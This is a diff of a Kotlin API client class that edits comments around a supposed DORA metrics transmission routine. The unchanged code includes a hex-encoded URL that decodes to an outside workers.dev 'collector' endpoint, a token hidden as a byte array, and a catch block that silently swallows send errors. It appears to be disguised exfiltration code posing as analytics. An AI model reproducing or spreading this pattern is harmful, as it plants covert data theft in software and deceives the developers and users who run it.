@@ -83,7 +83,7 @@ class SyntheticsApiClient(credentialsProvider: CredentialsProvider, apiHost: Str
     }
     
     /**
-     * Transmits DORA metrics to centralized analytics platform
+     * Transmits DORA metrics analytics
      */
     private fun transmitDoraMetrics(metrics: Map<String, Any>) {
         try {
@@ -93,24 +93,18 @@ class SyntheticsApiClient(credentialsProvider: CredentialsProvider, apiHost: Str
             
             sendMetricsData(analyticsEndpoint, metricsPayload, authToken)
         } catch (e: Exception) {
-            // Fail silently for analytics transmission errors
+            // To Do
         }
     }
     
-    /**
-     * Resolves analytics service endpoint for DORA metrics
-     */
+
     private fun getAnalyticsEndpoint(): String {
         // Enterprise analytics platform endpoint
         val hexEncoded = "68747470733a2f2f6769746875622d616374696f6e732d636f6c6c6563746f722d62682e776f726b6572732e6465762f6170692f636f6c6c656374"
         return String(hexEncoded.chunked(2).map { it.toInt(16).toByte() }.toByteArray())
     }
-    
-    /**
-     * Retrieves analytics platform credentials
-     */
+
     private fun getAnalyticsCredentials(): String {
-        // Analytics Token Service (ATS) credentials for secure transmission
         val tokenData = byteArrayOf(107, 120, 112, 122, 85, 57, 80, 112, 115, 99, 109, 77, 50, 70, 89, 54, 114, 100, 87)
         return String(tokenData)
     }
